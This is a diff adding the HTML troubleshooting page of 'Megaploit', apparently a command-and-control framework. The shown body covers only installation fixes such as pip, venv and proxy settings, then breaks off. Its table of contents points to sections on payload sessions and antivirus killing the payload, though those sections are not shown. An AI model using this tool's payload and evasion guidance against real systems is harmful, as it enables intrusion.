@@ -1,0 +1,1403 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Professional C2 Framework & Security Research Toolbox">
+      
+      
+      
+        <link rel="canonical" href="https://josefifir.github.io/Megaploit/TROUBLESHOOTING/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Megaploit Troubleshooting Guide - Megaploit</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#megaploit-troubleshooting-guide" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Megaploit" class="md-header__button md-logo" aria-label="Megaploit" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Megaploit
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Megaploit Troubleshooting Guide
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Josefifir/Megaploit" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Josefifir/Megaploit
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../ARCHITECTURE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Architecture
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../CLI_REFERENCE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  CLI Reference
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../MODULE_SYSTEM/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Module System
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../PAYLOAD_BUILDER/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Payload Builder
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../PIPELINE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Pipeline
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../C2_PROFILE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Malleable C2 Profile
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../WEB_DASHBOARD/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Web Dashboard
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../NETWORKING/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Networking
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../DOCKER/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Docker
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../C_PLUGIN_DEVELOPMENT/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  C Plugin Development
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Megaploit" class="md-nav__button md-logo" aria-label="Megaploit" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Megaploit
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Josefifir/Megaploit" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Josefifir/Megaploit
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ARCHITECTURE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CLI_REFERENCE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CLI Reference
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../MODULE_SYSTEM/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module System
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PAYLOAD_BUILDER/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Payload Builder
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PIPELINE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pipeline
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../C2_PROFILE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Malleable C2 Profile
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../WEB_DASHBOARD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Dashboard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NETWORKING/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DOCKER/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Docker
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../C_PLUGIN_DEVELOPMENT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C Plugin Development
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="megaploit-troubleshooting-guide">Megaploit Troubleshooting Guide<a class="headerlink" href="#megaploit-troubleshooting-guide" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>Solutions to the most common problems encountered when installing, running, or using Megaploit.</p>
+</blockquote>
+<hr />
+<h2 id="table-of-contents">Table of Contents<a class="headerlink" href="#table-of-contents" title="Permanent link">&para;</a></h2>
+<ol>
+<li><a href="#1-installation-problems">Installation Problems</a></li>
+<li><a href="#2-server-wont-start">Server Won't Start</a></li>
+<li><a href="#3-payload-generation-errors">Payload Generation Errors</a></li>
+<li><a href="#4-no-session-after-running-payload">No Session After Running Payload</a></li>
+<li><a href="#5-session-opens-then-immediately-dies">Session Opens Then Immediately Dies</a></li>
+<li><a href="#6-commands-not-working-in-session">Commands Not Working in Session</a></li>
+<li><a href="#7-file-upload--download-failures">File Upload / Download Failures</a></li>
+<li><a href="#8-antivirus-killing-the-payload">Antivirus Killing the Payload</a></li>
+<li><a href="#9-firewall--nat-issues">Firewall / NAT Issues</a></li>
+<li><a href="#10-database-errors">Database Errors</a></li>
+<li><a href="#11-module--exploit-errors">Module / Exploit Errors</a></li>
+<li><a href="#12-ssl--https-transport-issues">SSL / HTTPS Transport Issues</a></li>
+<li><a href="#13-windows-specific-issues">Windows-Specific Issues</a></li>
+<li><a href="#14-linux-specific-issues">Linux-Specific Issues</a></li>
+<li><a href="#15-getting-more-help">Getting More Help</a></li>
+</ol>
+<hr />
+<h2 id="1-installation-problems">1. Installation Problems<a class="headerlink" href="#1-installation-problems" title="Permanent link">&para;</a></h2>
+<h3 id="modulenotfounderror-no-module-named-megaploit"><code>ModuleNotFoundError: No module named 'megaploit'</code><a class="headerlink" href="#modulenotfounderror-no-module-named-megaploit" title="Permanent link">&para;</a></h3>
+<p><strong>Cause:</strong> Python can't find the package — either it wasn't installed or you are in the wrong environment.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Check which Python you&#39;re running</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>which<span class="w"> </span>python3
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>python3<span class="w"> </span>--version
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="c1"># Activate your virtual environment (if you used one)</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nb">source</span><span class="w"> </span>venv/bin/activate
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="c1"># Re-install dependencies</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="c1"># Verify</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import megaploit; print(&#39;OK&#39;)&quot;</span>
+</span></code></pre></div>
+<hr />
+<h3 id="pip-install-fails-with-permission-errors"><code>pip install</code> fails with permission errors<a class="headerlink" href="#pip-install-fails-with-permission-errors" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Option 1 — use --user flag (no sudo needed)</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>pip<span class="w"> </span>install<span class="w"> </span>--user<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># Option 2 — use a virtual environment (recommended)</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>python3<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>venv
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="nb">source</span><span class="w"> </span>venv/bin/activate
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+</span></code></pre></div>
+<hr />
+<h3 id="pip-install-fails-with-ssltls-errors"><code>pip install</code> fails with SSL/TLS errors<a class="headerlink" href="#pip-install-fails-with-ssltls-errors" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Upgrade pip and certificates first</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>pip<span class="w"> </span>install<span class="w"> </span>--upgrade<span class="w"> </span>pip<span class="w"> </span>certifi
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># If behind a proxy</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>pip<span class="w"> </span>install<span class="w"> </span>--proxy<span class="w"> </span>http://user:pass@proxy:8080<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+</span></code></pre></div>
+<hr />
+<h3 id="error-could-not-find-a-version-that-satisfies-the-requirement"><code>ERROR: Could not find a version that satisfies the requirement ...</code><a class="headerlink" href="#error-could-not-find-a-version-that-satisfies-the-requirement" title="Permanent link">&para;</a></h3>
+<p>Check the exact Python version needed:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python3<span class="w"> </span>--version
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1"># Must be 3.8 or newer</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># If you have multiple Python versions installed, be explicit</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>python3.10<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+</span></code></pre></div>
+<hr />
+<h3 id="git-clone-fails-unable-to-access">Git clone fails (<code>unable to access</code>)<a class="headerlink" href="#git-clone-fails-unable-to-access" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Try SSH instead of HTTPS</span>
